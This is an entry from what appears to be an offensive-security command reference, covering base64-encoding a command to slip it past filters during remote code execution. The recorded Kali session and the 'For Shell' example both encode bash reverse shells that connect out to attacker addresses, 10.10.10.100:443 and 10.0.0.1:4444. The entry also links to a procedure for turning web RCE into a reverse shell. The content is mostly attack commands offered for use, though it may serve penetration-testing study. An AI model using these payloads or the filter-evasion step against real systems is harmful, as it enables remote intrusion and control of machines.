---
id: f8825d15-7fd0-4657-bd80-fa7958917d81
type: command
executor: bash
data: echo -n "$_COMMAND" | base64 -w 0
output: |-
  root@kali:~# echo -n 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1' | base64 -w 0
  YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE=
created_at: '2019-12-05T03:01:00.083896+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - encoding
  - bypass
verified: true
validated: true
---

# base64-encode-command

## Command

```bash
echo -n "$_COMMAND" | base64 -w 0
```

## Description

Encodes a command string in base64 without line wraps, useful for bypassing filters in RCE scenarios by sending encoded payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | No trailing newline | Yes |
| $_COMMAND | Command to encode | Yes |
| -w 0 | No wrap (unlimited line length) | Yes |

## Examples

### Basic Usage

```bash
echo -n 'id' | base64 -w 0
```

### For Shell

```bash
echo -n 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64 -w 0
```

## Expected Output

Base64 string like YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE=.

## Related

- [[procedures/Upgrade-Web-RCE-to-Reverse-Shell-on-Linux]]
